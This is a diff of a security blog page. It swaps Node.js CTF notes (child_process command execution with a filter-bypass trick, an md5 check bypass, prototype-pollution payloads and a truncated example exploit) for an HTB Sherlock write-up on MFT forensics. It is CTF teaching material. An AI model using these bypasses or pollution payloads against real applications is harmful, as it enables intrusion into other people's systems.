@@ -14,7 +14,7 @@
 
 <html lang="zh-cn"><head>
     <meta charset="utf-8" />
-    <title>NodeJs | 遥乡书屋</title>
+    <title>BFT | 遥乡书屋</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="M1st0ry's blog" />
     <meta name="keywords" content="Documentation, CTF, HTB, M1st0ry" />
@@ -30,359 +30,39 @@
 <link rel="icon" type="image/png" sizes="32x32" href="https://c0ld1nk.github.io/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="https://c0ld1nk.github.io/favicon-16x16.png">
 <link rel="manifest" crossorigin="use-credentials" href="https://c0ld1nk.github.io/site.webmanifest">
-<meta property="og:title" content="NodeJs" />
-<meta property="og:description" content="命令执行 link
+<meta property="og:title" content="BFT" />
+<meta property="og:description" content="解压密码为hacktheblue
+
+在本期福尔摩斯探案中，您将深入了解 MFT（主文件表）取证技术。我们将介绍用于分析 MFT 痕迹以识别恶意活动的知名工具与方法论。在分析过程中，您将使用 MFTECmd 工具解析提供的 MFT 文件，通过 TimeLine Explorer 打开并分析解析结果，并借助十六进制编辑器从 MFT 中恢复文件内容。
+
+MFT，全称Master File Table，即主文件表，它是NTFS文件系统的核心。它是包含了NTFS卷中所有文件信息的数据库，在$MFT中每个文件（包括MFT本身）至少有一个MFT，记录着该文件的各种信息。这些信息被称为属性。
+NTFS使用MFT条目定义它们对应的文件，有关文件的所有信息，比如大小、时间、权限等都存在MFT条目中，或者由MFT条目描述存储在MFT外部的空间中。
 
 
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  require(&#39;child_process&#39;).exec(&#39;ls&#39;); //返回值是child_process，不能转字符串
-require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString(); //返回值是字符串
-require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();// 返回object，toString转成字符串
-//绕过简单的限制
-require(&#39;child_process&#39;)[&#39;exe&#39;&#43;&#39;cSync&#39;](&#39;ls&#39;).toString()
-  
-  
-不用child_process读取文件
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  __filename //获取当前文件的绝对路径
-__dirname //获取当前文件解析过后的文件夹的绝对路径
-require(&#39;fs&#39;).readFileSync(__filename,&#39;utf-8&#39;); //读取当前文件
-require(&#39;fs&#39;).readdirSync(&#39;.&#39;) //读取当前目录下所有文件
-  
-  
-md5 link
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a&#43;flag)===md5(b&#43;flag))
-  
-  
-
-传入a[]=1&amp;b[]=2
-得到的是[&lsquo;1&rsquo;]和[&lsquo;2&rsquo;]
-而nodejs中数组和字符串的拼接如下：
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  console.log(5&#43;[6,6]); //56,6
-console.log(&#34;5&#34;&#43;6); //56
-console.log(&#34;5&#34;&#43;[6,6]); //56,6
-console.log(&#34;5&#34;&#43;[&#34;6&#34;,&#34;6&#34;]); //56,6
-  
-  
-
-则[&lsquo;a&rsquo;]&#43;flag== &lsquo;a&rsquo;&#43;flag
-如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:&#39;1&#39;}
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  let a={
-    x:&#39;1&#39;
-}
-console.log(a&#43;&#34;flag{123}&#34;)
-//返回的是： [object Object]flag{123}
-  
-  
-
-所以传入a[x]=1&amp;b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。
-原型链污染 link
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  //定义一个类
-function Foo() {
-    this.bar = 1
-}
-
-new Foo()
-
-//类内的方法
-function Foo() {
-    this.bar = 1
-    this.show = function() {
-        console.log(this.bar)
-        this.bar=this.bar&#43;1
-    }
-}
-
-(new Foo()).show() //输出1
-//但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上
-//使用原型prototype创建类时，就会只创建一次show方法。
-function Foo() {
-    this.bar = 1
-}
-
-Foo.prototype.show = function show() {
-    console.log(this.bar)
-}
-
-let foo = new Foo()
-foo.show() //输出1
-//原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。
-//foo对象天生就有show方法
-//通过proto属性可以访问类的原型，即：
-foo.__proto__==Foo.prototype
-  
-  
-
-总结：
-prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法" />
+MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT项占用1024字节的空间。这个概念相当于Linux中的inode，File Record在$MFT文件中物理上是连续的，且从0开始编号，每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。(-via 百度百科)
+Task1 link
+西蒙·斯塔克在 2 月 13 日遭到攻击者针对。他从邮件中的链接下载了一个 ZIP 文件。请问他从该链接下载的 ZIP 文件名称是什么？
+Stage-20240213T093324Z-001.zip
+下载工具MftCmd来提取MFT条目，或者直接RStudio提取文件内容也能找到(不推荐，因为文件数据流没了)" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://c0ld1nk.github.io/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/nodejs/" /><meta property="og:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_8f82c71b2c00abe3.png"/><meta property="article:section" content="docs" />
-<meta property="article:published_time" content="2025-05-29T16:38:45+08:00" />
-<meta property="article:modified_time" content="2025-05-29T16:38:45+08:00" /><meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_8f82c71b2c00abe3.png"/>
-<meta name="twitter:title" content="NodeJs"/>
-<meta name="twitter:description" content="命令执行 link
+<meta property="og:url" content="https://c0ld1nk.github.io/docs/htb/sherlock/bft/" /><meta property="og:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_682a888f70cae165.png"/><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2025-06-01T16:22:12+08:00" />
+<meta property="article:modified_time" content="2025-06-01T16:22:12+08:00" /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_682a888f70cae165.png"/>
+<meta name="twitter:title" content="BFT"/>
+<meta name="twitter:description" content="解压密码为hacktheblue
+
+在本期福尔摩斯探案中，您将深入了解 MFT（主文件表）取证技术。我们将介绍用于分析 MFT 痕迹以识别恶意活动的知名工具与方法论。在分析过程中，您将使用 MFTECmd 工具解析提供的 MFT 文件，通过 TimeLine Explorer 打开并分析解析结果，并借助十六进制编辑器从 MFT 中恢复文件内容。
+
+MFT，全称Master File Table，即主文件表，它是NTFS文件系统的核心。它是包含了NTFS卷中所有文件信息的数据库，在$MFT中每个文件（包括MFT本身）至少有一个MFT，记录着该文件的各种信息。这些信息被称为属性。
+NTFS使用MFT条目定义它们对应的文件，有关文件的所有信息，比如大小、时间、权限等都存在MFT条目中，或者由MFT条目描述存储在MFT外部的空间中。
 
 
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  require(&#39;child_process&#39;).exec(&#39;ls&#39;); //返回值是child_process，不能转字符串
-require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString(); //返回值是字符串
-require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();// 返回object，toString转成字符串
-//绕过简单的限制
-require(&#39;child_process&#39;)[&#39;exe&#39;&#43;&#39;cSync&#39;](&#39;ls&#39;).toString()
-  
-  
-不用child_process读取文件
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  __filename //获取当前文件的绝对路径
-__dirname //获取当前文件解析过后的文件夹的绝对路径
-require(&#39;fs&#39;).readFileSync(__filename,&#39;utf-8&#39;); //读取当前文件
-require(&#39;fs&#39;).readdirSync(&#39;.&#39;) //读取当前目录下所有文件
-  
-  
-md5 link
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a&#43;flag)===md5(b&#43;flag))
-  
-  
-
-传入a[]=1&amp;b[]=2
-得到的是[&lsquo;1&rsquo;]和[&lsquo;2&rsquo;]
-而nodejs中数组和字符串的拼接如下：
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  console.log(5&#43;[6,6]); //56,6
-console.log(&#34;5&#34;&#43;6); //56
-console.log(&#34;5&#34;&#43;[6,6]); //56,6
-console.log(&#34;5&#34;&#43;[&#34;6&#34;,&#34;6&#34;]); //56,6
-  
-  
-
-则[&lsquo;a&rsquo;]&#43;flag== &lsquo;a&rsquo;&#43;flag
-如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:&#39;1&#39;}
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  let a={
-    x:&#39;1&#39;
-}
-console.log(a&#43;&#34;flag{123}&#34;)
-//返回的是： [object Object]flag{123}
-  
-  
-
-所以传入a[x]=1&amp;b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。
-原型链污染 link
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  //定义一个类
-function Foo() {
-    this.bar = 1
-}
-
-new Foo()
-
-//类内的方法
-function Foo() {
-    this.bar = 1
-    this.show = function() {
-        console.log(this.bar)
-        this.bar=this.bar&#43;1
-    }
-}
-
-(new Foo()).show() //输出1
-//但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上
-//使用原型prototype创建类时，就会只创建一次show方法。
-function Foo() {
-    this.bar = 1
-}
-
-Foo.prototype.show = function show() {
-    console.log(this.bar)
-}
-
-let foo = new Foo()
-foo.show() //输出1
-//原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。
-//foo对象天生就有show方法
-//通过proto属性可以访问类的原型，即：
-foo.__proto__==Foo.prototype
-  
-  
-
-总结：
-prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法"/>
+MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT项占用1024字节的空间。这个概念相当于Linux中的inode，File Record在$MFT文件中物理上是连续的，且从0开始编号，每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。(-via 百度百科)
+Task1 link
+西蒙·斯塔克在 2 月 13 日遭到攻击者针对。他从邮件中的链接下载了一个 ZIP 文件。请问他从该链接下载的 ZIP 文件名称是什么？
+Stage-20240213T093324Z-001.zip
+下载工具MftCmd来提取MFT条目，或者直接RStudio提取文件内容也能找到(不推荐，因为文件数据流没了)"/>
 
     
         <link rel="alternate" type="application/atom+xml" title="Atom feed for 遥乡书屋" href="/index.xml" />
@@ -420,20 +100,20 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
                 
                     
                     
-                        <li class="sidebar-dropdown no-icon current active">
+                        <li class="sidebar-dropdown no-icon ">
                             <button class="btn">
                                 CTF
                             </button>
-                            <div class="sidebar-submenu d-block">
+                            <div class="sidebar-submenu ">
                                 <ul>
                                     
                                         
                                         
-                                            <li class="sidebar-dropdown nested no-icon current active">
+                                            <li class="sidebar-dropdown nested no-icon ">
                                                 <button class="btn">
                                                     知识点
                                                 </button>
-                                                <div class="sidebar-submenu d-block">
+                                                <div class="sidebar-submenu ">
                                                     <ul>
                                                         
                                                             
@@ -448,7 +128,7 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
                                                         
                                                             
                                                             
-                                                                <li class="current no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/nodejs/">NodeJs</a></li>
+                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/nodejs/">NodeJs</a></li>
                                                             
                                                         
                                                     </ul>
@@ -463,11 +143,11 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
                 
                     
                     
-                        <li class="sidebar-dropdown no-icon ">
+                        <li class="sidebar-dropdown no-icon current active">
                             <button class="btn">
                                 HTB
                             </button>
-                            <div class="sidebar-submenu ">
+                            <div class="sidebar-submenu d-block">
                                 <ul>
                                     
                                         
@@ -491,16 +171,16 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
                                     
                                         
                                         
-                                            <li class="sidebar-dropdown nested no-icon ">
+                                            <li class="sidebar-dropdown nested no-icon current active">
                                                 <button class="btn">
                                                     Sherlock
                                                 </button>
-                                                <div class="sidebar-submenu ">
+                                                <div class="sidebar-submenu d-block">
                                                     <ul>
                                                         
                                                             
                                                             
-                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/htb/sherlock/bft/">BFT</a></li>
+                                                                <li class="current no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/htb/sherlock/bft/">BFT</a></li>
                                                             
                                                         
                                                             
@@ -708,23 +388,23 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
             
             
                 <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-                    <a itemprop="item" href="/docs/ctf/">
-                        <span itemprop="name">CTF</span>
+                    <a itemprop="item" href="/docs/htb/">
+                        <span itemprop="name">HTB</span>
                     </a>
                     <meta itemprop="position" content='2' />
                 </li>
             
             
                 <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-                    <a itemprop="item" href="/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/">
-                        <span itemprop="name">知识点</span>
+                    <a itemprop="item" href="/docs/htb/sherlock/">
+                        <span itemprop="name">Sherlock</span>
                     </a>
                     <meta itemprop="position" content='3' />
                 </li>
             
         
             <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-                <span itemprop="name">NodeJs</span>
+                <span itemprop="name">BFT</span>
                 <meta itemprop="position" content='4' />
             </li>
         
@@ -733,48 +413,22 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
                                     
                                     <div class="row flex-xl-nowrap">
                                         
-                                        <div class="docs-toc col-xl-3    d-xl-block"><toc>
+                                        <div class="docs-toc col-xl-3  visually-hidden  d-xl-block"><toc>
     <div class="fw-bold text-uppercase mb-2">On this page</div>
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#原理">原理</a></li>
-    <li><a href="#使用场景">使用场景</a></li>
-    <li><a href="#例题">例题：</a>
-      <ul>
-        <li><a href="#1">1</a></li>
-        <li><a href="#2">2</a></li>
-        <li><a href="#3">3</a></li>
-        <li><a href="#4">4</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
+    <nav id="TableOfContents"></nav>
     </toc></div>
                                         
                                         
-                                        <div class="docs-toc-mobile    d-print-none d-xl-none">
+                                        <div class="docs-toc-mobile  visually-hidden  d-print-none d-xl-none">
                                             <button id="toc-dropdown-btn" class="btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" data-bs-offset="0,0" aria-expanded="false">
                                                 Table of Contents
                                             </button>
-<nav id="toc-mobile">
-  <ul class="dropdown-menu">
-    <li><a href="#原理">原理</a></li>
-    <li><a href="#使用场景">使用场景</a></li>
-    <li><a href="#例题">例题：</a>
-      <ul>
-        <li><a href="#1">1</a></li>
-        <li><a href="#2">2</a></li>
-        <li><a href="#3">3</a></li>
-        <li><a href="#4">4</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav></div>
-                                        <div class="docs-content col-12 col-xl-9 mt-0">
+<nav id="toc-mobile"></nav></div>
+                                        <div class="docs-content col-12  mt-0">
                                             <div class="mb-0 d-flex">
                                                 
                                                 <h1 class="content-title mb-0">
-                                                    NodeJs
+                                                    BFT
                                                     
                                                 </h1>
                                             </div>
@@ -783,669 +437,129 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
                                                 
     
     <div data-prismjs-copy="" data-prismjs-copy-success="" data-prismjs-copy-error="">
-        <h1 id="命令执行">命令执行 <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="298affe" class="language-js ">
-  <code>require(&#39;child_process&#39;).exec(&#39;ls&#39;); //返回值是child_process，不能转字符串
-require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString(); //返回值是字符串
-require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();// 返回object，toString转成字符串
-//绕过简单的限制
-require(&#39;child_process&#39;)[&#39;exe&#39;&#43;&#39;cSync&#39;](&#39;ls&#39;).toString()</code>
-  </pre>
-  </div>
-<p>不用<code>child_process</code>读取文件</p>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="b75ef0f" class="language-js ">
-  <code>__filename //获取当前文件的绝对路径
-__dirname //获取当前文件解析过后的文件夹的绝对路径
-require(&#39;fs&#39;).readFileSync(__filename,&#39;utf-8&#39;); //读取当前文件
-require(&#39;fs&#39;).readdirSync(&#39;.&#39;) //读取当前目录下所有文件</code>
-  </pre>
-  </div>
-<h1 id="md5">md5 <a href="#md5" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="6111101" class="language-js ">
-  <code>if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a&#43;flag)===md5(b&#43;flag))</code>
-  </pre>
-  </div>
+        <p>解压密码为hacktheblue</p>
 <blockquote>
-<p>传入a[]=1&amp;b[]=2
-得到的是[&lsquo;1&rsquo;]和[&lsquo;2&rsquo;]
-而nodejs中数组和字符串的拼接如下：</p></blockquote>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="a825148" class="language-js ">
-  <code>console.log(5&#43;[6,6]); //56,6
-console.log(&#34;5&#34;&#43;6); //56
-console.log(&#34;5&#34;&#43;[6,6]); //56,6
-console.log(&#34;5&#34;&#43;[&#34;6&#34;,&#34;6&#34;]); //56,6</code>
-  </pre>
-  </div>
+<p>在本期福尔摩斯探案中，您将深入了解 MFT（主文件表）取证技术。我们将介绍用于分析 MFT 痕迹以识别恶意活动的知名工具与方法论。在分析过程中，您将使用 MFTECmd 工具解析提供的 MFT 文件，通过 TimeLine Explorer 打开并分析解析结果，并借助十六进制编辑器从 MFT 中恢复文件内容。</p></blockquote>
 <blockquote>
-<p>则[&lsquo;a&rsquo;]+flag== &lsquo;a&rsquo;+flag</p></blockquote>
-<p>如果传入的是非数字索引，比如<code>[x]=1</code>，那么就会变为js的对象<code>{x:'1'}</code></p>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="0138822" class="language-js ">
-  <code>let a={
-    x:&#39;1&#39;
-}
-console.log(a&#43;&#34;flag{123}&#34;)
-//返回的是： [object Object]flag{123}</code>
-  </pre>
-  </div>
+<p>MFT，全称Master File Table，即主文件表，它是NTFS文件系统的核心。它是包含了NTFS卷中所有文件信息的数据库，在$MFT中每个文件（包括MFT本身）至少有一个MFT，记录着该文件的各种信息。这些信息被称为属性。</p></blockquote>
+<p>NTFS使用MFT条目定义它们对应的文件，有关文件的所有信息，比如大小、时间、权限等都存在MFT条目中，或者由MFT条目描述存储在MFT外部的空间中。</p>
 <blockquote>
-<p>所以传入a[x]=1&amp;b[x]=1也能绕过，此时<code>a!==b</code>比较的是内存地址，而不是键值。</p></blockquote>
-<h1 id="原型链污染">原型链污染 <a href="#%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
+</blockquote>
+<p>MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT项占用1024字节的空间。这个概念相当于Linux中的inode，File Record在$MFT文件中物理上是连续的，且从0开始编号，每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。(-via 百度百科)</p>
+<h1 id="task1">Task1 <a href="#task1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
+<p>西蒙·斯塔克在 2 月 13 日遭到攻击者针对。他从邮件中的链接下载了一个 ZIP 文件。请问他从该链接下载的 ZIP 文件名称是什么？</p>
+<p>Stage-20240213T093324Z-001.zip</p></blockquote>
+<p>下载工具<a href="https://ericzimmerman.github.io/#!index.md" rel="external" target="_blank">MftCmd<svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/></svg></a>来提取MFT条目，或者直接RStudio提取文件内容也能找到(不推荐，因为文件数据流没了)</p>
+<p>西蒙用户下载目录下有两个zip文件</p>
+<p>
+
+
 
 
   
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250601140624.png" alt="" loading="lazy">
   
-  
+</p>
+<p>第二个的命名有213，那就是第二个</p>
+<p>或者使用mftcmd转成csv文件再用<code>Time Line Explore</code>搜索zip文件</p>
+<p>
+
+
+
 
   
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250601150635.png" alt="" loading="lazy">
   
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="7faf206" class="language-js ">
-  <code>//定义一个类
-function Foo() {
-    this.bar = 1
-}
-
-new Foo()
-
-//类内的方法
-function Foo() {
-    this.bar = 1
-    this.show = function() {
-        console.log(this.bar)
-        this.bar=this.bar&#43;1
-    }
-}
-
-(new Foo()).show() //输出1
-//但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上
-//使用原型prototype创建类时，就会只创建一次show方法。
-function Foo() {
-    this.bar = 1
-}
-
-Foo.prototype.show = function show() {
-    console.log(this.bar)
-}
-
-let foo = new Foo()
-foo.show() //输出1
-//原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。
-//foo对象天生就有show方法
-//通过proto属性可以访问类的原型，即：
-foo.__proto__==Foo.prototype</code>
-  </pre>
-  </div>
+</p>
+<h1 id="task2">Task2 <a href="#task2" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
+<p>检查最初下载的 ZIP 文件的区域标识符内容。该字段显示了文件下载来源的 HostUrl，这是我们调查/分析中重要的入侵指标(IOC)。这个 ZIP 文件的完整下载主机 URL 是什么？</p>
+<p><code>https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser</code></p></blockquote>
 <blockquote>
-<p>总结：
-<code>prototype</code>是一个类的属性，所有类对象实例化时都会有<code>prototype</code>中的属性和方法</p></blockquote>
-<h1 id="js中的继承">js中的继承 <a href="#js%e4%b8%ad%e7%9a%84%e7%bb%a7%e6%89%bf" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><p>js中的继承使用的便是<code>prototype</code></p>
+<p>什么是区域标识符：下载文件的时候会产生一个数据流Zone.Indentifier，里面包含了文件的来源</p></blockquote>
+<p>上一题搜索得到的结果下一条就是</p>
+<p>
 
 
 
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="d31e4fb" class="language-js ">
-  <code>function Father() {
-    this.first_name = &#39;Donald&#39;
-    this.last_name = &#39;Trump&#39;
-}
-
-function Son() {
-    this.first_name = &#39;Melania&#39;
-}
-
-Son.prototype = new Father()
-
-let son = new Son()
-console.log(`Name: ${son.first_name} ${son.last_name}`)
-//输出：Name: Melania Trump
-//此过程为：在son中找last_name，如果找不到就在son.__proto__找，如果还找不到，就在son.__proto__.__proto__里找，依次寻找直到null结束，如Object.prototype的__proto__就是null</code>
-  </pre>
-  </div>
-<h1 id="原型链污染-1">原型链污染 <a href="#%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><h2 id="原理">原理 <a href="#%e5%8e%9f%e7%90%86" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>可以访问原型，也可以修改原型的值</p>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="13db417" class="language-js ">
-  <code>let foo = {bar: 1}
-
-// foo.bar 此时为1
-console.log(foo.bar)
-
-// 修改foo的原型（即Object）
-foo.__proto__.bar = 2
-
-// 由于查找顺序的原因，foo.bar仍然是1
-console.log(foo.bar)
-
-// 此时再用Object创建一个空的zoo对象
-let zoo = {}
-
-// 查看zoo.bar
-console.log(zoo.bar)
-//尽管zoo为空对象，依然输出了1 1 2
-//foo.__proto__实际上是一个Object类的实例，所以其实是给这个类新增了一个bar属性。所以新建的zoo继承Object，自然也有bar属性</code>
-  </pre>
-  </div>
-<h2 id="使用场景">使用场景 <a href="#%e4%bd%bf%e7%94%a8%e5%9c%ba%e6%99%af" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>找到能控制的数组（对象）的键名的操作即可</p>
-<ul>
-<li>对象merge</li>
-<li>对象clone</li>
-</ul>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="b784108" class="language-js ">
-  <code>function merge(target, source) {
-    for (let key in source) {
-        if (key in source &amp;&amp; key in target) {
-            merge(target[key], source[key])
-        } else {
-            target[key] = source[key]
-        }
-    }
-}</code>
-  </pre>
-  </div>
-<p>存在<code>target[key]</code> = <code>source[key]</code>，如果<code>key</code>为<code>__proto__</code>呢</p>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="98d7d95" class="language-js ">
-  <code>let o1 = {}
-let o2 = {a: 1, &#34;__proto__&#34;: {b: 2}}
-merge(o1, o2)
-console.log(o1.a, o1.b)
-// 输出1 2
-o3 = {}
-console.log(o3.b)
-//输出空</code>
-  </pre>
-  </div>
-<p>合并成功了，但是原型链没有被污染。
-因为创建o2的过程<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code>中，<code>__proto__&quot;</code>已经代表o2的原型了，遍历键名，得到的是<code>a，b</code>，而不是<code>a,__proto__</code>，也就无法修改原型</p>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="3150a4d" class="language-js ">
-  <code>let o1 = {}
-let o2 = JSON.parse(&#39;{&#34;a&#34;: 1, &#34;__proto__&#34;: {&#34;b&#34;: 2}}&#39;)
-merge(o1, o2)
-console.log(o1.a, o1.b)
-
-o3 = {}
-console.log(o3.b)
-//输出1 2 2，原型链被污染</code>
-  </pre>
-  </div>
-<p>因为在json解析下，<code>__proto__</code>是一个真正的键名，而不代表原型，后面遍历o2时也能正常获取键名。</p>
-<h2 id="例题">例题： <a href="#%e4%be%8b%e9%a2%98" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><h3 id="1">1 <a href="#1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="39a0a57" class="language-js ">
-  <code>router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) {
-
-  res.type(&#39;html&#39;);
-
-  var flag=&#39;flag_here&#39;;
-
-  var secert = {};
-
-  var sess = req.session;
-
-  let user = {};
-
-  utils.copy(user,req.body);
-
-  if(secert.ctfshow===&#39;36dboy&#39;){
-
-    res.end(flag);
-
-  }else{
-
-    return res.json({ret_code: 2, ret_msg: &#39;登录失败&#39;&#43;JSON.stringify(user)});  
-
-  }
-
-});</code>
-  </pre>
-  </div>
-<p>因为存在<code>utils.copy</code>函数</p>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
 
-  <div class="prism-codeblock ">
-  <pre id="6f61cdd" class="language-js ">
-  <code>function copy(object1, object2){
-
-    for (let key in object2) {
-
-        if (key in object2 &amp;&amp; key in object1) {
-
-            copy(object1[key], object2[key])
-
-        } else {
-
-            object1[key] = object2[key]
-
-        }
-
-    }
-
-  }</code>
-  </pre>
-  </div>
-<p>所以有原型链污染
-传入payload：</p>
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="579fc88" class="language-json ">
-  <code>{
-    &#34;username&#34;: &#34;a&#34;,
-    &#34;__proto__&#34;: {
